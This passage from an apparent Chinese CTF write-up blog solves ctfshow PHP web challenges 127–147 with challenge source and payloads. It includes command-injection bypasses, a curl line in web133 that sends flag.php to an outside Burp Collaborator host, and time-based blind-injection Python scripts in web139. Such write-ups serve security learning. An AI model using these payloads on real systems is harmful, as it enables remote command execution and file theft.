class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了<code>_</code>，绕过方式还是同web123<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="gettext-拓展的应用"><a href="#gettext-拓展的应用" class="headerlink" title="gettext()拓展的应用"></a>gettext()拓展的应用</h3><p>很骚的一个操作，参考文章:</p>
<blockquote>
<p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">关于php中gettext的用法？</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">Gettext</a></p>
</blockquote>
<p>在开启该拓展后 _() 等效于 gettext(),如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果 phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="call-user-func-函数-1"><a href="#call-user-func-函数-1" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong></p>
<blockquote>
<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
</blockquote>
<p>所以<code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code>相当于<code>gettext(&quot;phpinfo&quot;)</code><br>这题可以利用get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() 函数返回由所有已定义变量所组成的数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题可以利用get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() 函数返回由所有已定义变量所组成的数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><p>目录穿越<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个题也挺骚的，有很多种解法，首先是利用正则最大回溯次数绕过<br>正则最大回溯次数绕过<br>回溯现象：</p>
<blockquote>
<p>PHP中，为了防止一次正则匹配调用的匹配过程过大从而造成过多的资源消耗，限定了一次正则匹配中调用匹配函数的次数。 回溯主要有两种<br>1、贪婪模式下，pattern部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现<em>、+时容易产生。<br>2、非贪婪模式下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现</em>?、+?时容易产生。</p>
</blockquote>
<p>当传入字符串在正则匹配时回溯次数超过限制（默认1000000，可调整）时，会报错返回false<br>关于这种方法，题目中也给出了提示<br>very very very（省略25万个very）ctfshow<br>payload(py脚本):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://07b28eb7-15d4-4250-be72-33a58b73dba1.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">  <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行后，因为超出了<code>preg_match</code>的回溯次数，报错返回false，达到绕过的效果，同时因为POST传入的<code>f</code>中有<code>ctfshow</code>，第二个判断也被绕过，输出flag<br>还有两个比较强的姿势…首先是hint中给出的<code>f=ctfshow</code>，因为在第一个正则匹配中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>.</code>表示<code>任意单个字符</code>，<code>+</code>表示<code>必须匹配1次或多次</code>，<code>+?</code>表示 <code>重复1次或更多次，但尽可能少重复</code><br>所以在ctfshow前面必须有至少一个字符，才会返回True<br>还有一种姿势是<code>数组绕过</code>，传入数组时，stripos会返回<code>null</code>，<code>null!=false</code><br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST:f=ctfshow</span><br><span class="line">POST:f[]=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><p>考察<strong>正则最大回溯次数绕过</strong>，用上题的第一个姿势(记得把<code>ctfshow</code> 改成<code>36Dctfshow</code>)</p>
<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><p>查看robots.txt发现提示,访问得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mt_rand()<br>用于生成随机数<br>注意这个判断式<br>if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;”admin”)<br>这里三个都是强等于，不像弱等于一样好绕过，而且前两个条件可以说是不可能同时达成的,这里是利用了比较符的优先级<br>所以即使前两个条件不满足，只要第三个条件username&#x3D;&#x3D;&#x3D;”admin”满足即可,同时令code&#x3D;admin即可输出flag</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;code=admin&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>限制执行前6个字符，这题参考<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">Firebasky师傅的wp</a>，又是新姿势，具体的原理看师傅的博客。<br>先打开burp，获得一个域名</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload </span></span><br><span class="line"><span class="comment">#其中-F 为带文件的形式发送post请求</span></span><br><span class="line"><span class="comment">#xx是上传文件的name值，flag.php就是上传的文件 </span></span><br><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>


<p>我们传递?F&#x3D;<code>$F</code>;+sleep 3好像网站确实sleep了一会说明的确执行了命令<br><strong>那为什么会这样？</strong><br>因为是我们传递的<code>$F</code>;+sleep 3。先进行substr()函数截断然后去执行eval()函数<br>这个函数的作用是执行php代码，<code>是shell_exec()函数的缩写，然后就去命令执行。 而$F就是我们输入的</code>$F<code>;+sleep 3 使用最后执行的代码应该是 </code>$F<code>;+sleep 3</code>,就执行成功<br>这里可能有点绕，慢慢理解</p>
<h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>


<h1 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h1><p>在133的基础上增加了curl和其他一些字符的过滤，这时候其实可以通过ping得到flag的</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">F=`<span class="variable">$F</span> `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure>


<p>访问url&#x2F;xxx即可得到flag</p>
<h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><p>其实是再135的基础上增加了过滤<code>&gt;&lt; </code><br>但是linux中还可以用tee写文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls|tee xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>我们先来看下当前目录下有啥文件，访问url&#x2F;xxx发现只有一个index.php<br>那我们再去看看根目录下有什么文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls /|tee xxx</span><br></pre></td></tr></table></figure>


<p>得到 f149_15_h3r3<br>最后直接打开就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl  /f149_15_h3r3|tee xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><p>没有难度的一道题，考察调用类中的函数</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::<span class="variable constant_">getflag</span></span><br></pre></td></tr></table></figure>


<p>PHP中的<code>::</code> 指静态方法</p>
<h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><p>在上一题的基础上过滤了冒号<br>这时候就考察我们对call_user_func函数的使用了，call_user_func中不但可以传字符串也可以传数组。<br>具体使用方法如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><p>在136的基础上限制了写文件的权限，这时候可以考虑用盲打的方式。</p>
<p>猜测文件名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">  key=<span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">      payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line">      <span class="comment">#print(payload)</span></span><br><span class="line">      url=<span class="string">&quot;http://fd0a116f-e55b-449d-9acf-59f876b4e975.challenge.ctf.show/?c=&quot;</span>+payload</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">          result=result+n</span><br><span class="line">          <span class="built_in">print</span>(result)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        key=<span class="number">1</span></span><br><span class="line">  result+=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>得到flag所在文件 f149_15_h3r3，接着盲注文件内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">  <span class="built_in">print</span>(j)</span><br><span class="line">  <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line">    url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        result=result+n</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>因为过滤了{}所以会我们就不加{}出来，跑出来flag然后手动添加就可以了。<br>如果容易出错的话，可以在payload&#x3D;xxx前面加个time.sleep(0.1)</p>
<h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><p>可以看到只要我们让intval($code)为0就可以了intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code>所以方法就挺多了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br><span class="line">getdata</span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1=getcwd&amp;f2=getcwd</span><br></pre></td></tr></table></figure>


<h1 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>先来看下正则表达式<code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符构造命令还是很简单的，最主要的任务是return怎么绕过。大家可以看下下面的示例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1;phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。</p>
<p>这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-phpinfo()-。</p>
<p>现在我们的任务就是取构造命令，那我们就用个简单的方式取反来试一下。</p>
<p>运行脚本构造system(‘tac f*’)得到 (<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)<br>所以最终payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)-&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">0</span></span><br></pre></td></tr></table></figure>


<h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><p>过滤了加减我们还可以用乘除，过滤了~我们可以用异或构造命令具体命令构造payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=*(<span class="string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="string">&quot;%0b%01%03%00%06%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%60%2a&quot;</span>)*&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h1><p>相对上面的几道类似的弱化了些<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=-&amp;v2=(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><p>考察点：三目运算符的妙用<br>小测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这样是可以执行phpinfo()的<br>所以只需要在前面的payload上稍加改动就可以了<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5):&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><p>又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">v1=<span class="number">1</span>&amp;v3===(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">8</span>b%<span class="number">9</span>e%<span class="number">9</span>c%df%<span class="number">99</span>%d5)||&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>考察点：create_function()代码注入</p>
